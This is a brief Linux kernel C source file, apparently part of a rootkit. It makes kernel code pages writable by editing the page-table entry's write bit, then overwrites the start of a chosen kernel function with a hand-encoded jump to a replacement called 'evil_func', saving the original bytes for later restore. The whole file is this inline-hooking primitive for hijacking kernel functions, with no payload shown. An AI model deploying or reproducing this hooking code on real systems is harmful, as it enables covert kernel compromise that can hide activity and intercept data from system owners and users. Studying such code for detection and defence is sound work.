#include "hook.h"

LIST_HEAD(hook_list);

static void make_rw(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte |= _PAGE_RW;
}

static void make_ro(unsigned long addr)
{
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
}

void hook_start(unsigned long org_func, unsigned long evil_func)
{
    struct hook *new_hook = (struct hook *) vmalloc(sizeof(struct hook));
    new_hook->org_func = org_func;
    new_hook->evil_func = evil_func;
    memcpy(new_hook->org_code, (void *) org_func, HOOK_SIZE);
    memcpy(new_hook->evil_code, "H\xb8\x00\x00\x00\x00\x00\x00\x00\x00P\xc3",
           HOOK_SIZE);
    *(unsigned long *) &new_hook->evil_code[2] = evil_func;
    make_rw(org_func);
    memcpy((void *) org_func, new_hook->evil_code, HOOK_SIZE);
    make_ro(org_func);
    list_add(&new_hook->list, &hook_list);
}
